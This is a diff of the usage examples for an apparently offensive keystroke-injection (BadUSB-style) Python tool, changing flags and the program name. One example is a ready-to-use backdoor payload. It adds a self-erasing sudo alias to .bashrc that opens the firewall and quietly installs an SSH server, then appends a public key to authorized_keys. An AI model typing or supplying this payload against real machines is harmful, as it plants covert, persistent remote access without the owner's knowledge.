@@ -15,12 +15,12 @@ Examples:
 
 """
 example1 = "$ %(prog)s [-h] [-v] [options]"
-example2 = "$ %(prog)s -p firefox -tm unicode -v -pc promicro"
-example3 = "$ %(prog)s -sp 'echo gato; firefox algunsitio.com' -tm unicode -v -pc promicro"
-example4 = """$ %(prog)s python3 upload.py -sp " echo \" alias sudo='sudo iptables -P INPUT ACCEPT ; sudo apt install -qq -y openssh-server &> /dev/null ; grep -v \\\"#estalinea\\\" .bashrc >.tmp;mv .tmp .bashrc ; /usr/bin/sudo' #estalinea\" >> .bashrc ; echo \"ssh-rsa PUB-KEY-HERE \" >> \$HOME/.ssh/authorized_keys; exit; " -tm unicode -jc -otm ctrlaltt -em hex-bash -dp 0 -dl 0 -ctc"""
+example2 = "$ %(prog)s -p firefox -tm unicode -v -jc"
+example3 = "$ %(prog)s -sp 'echo gato; firefox algunsitio.com' -tm unicode -v -jc"
+example4 = """$ %(prog)s -sp " echo \" alias sudo='sudo iptables -P INPUT ACCEPT ; sudo apt install -qq -y openssh-server &> /dev/null ; grep -v \\\"#estalinea\\\" .bashrc >.tmp;mv .tmp .bashrc ; /usr/bin/sudo' #estalinea\" >> .bashrc ; echo \"ssh-rsa PUB-KEY-HERE \" >> \$HOME/.ssh/authorized_keys; exit; " -tm unicode -jc -otm ctrlaltt -em hex-bash -dp 0 -dl 0 -ctc -jc"""
 usage = example.format(example1, example2, example3, example4)
 
-parser = argparse.ArgumentParser(prog='python3 uploader.py', usage=usage)
+parser = argparse.ArgumentParser(prog='python3 run.py', usage=usage)
 
 parser.add_argument('-l', '--list',
                     action="store_true",
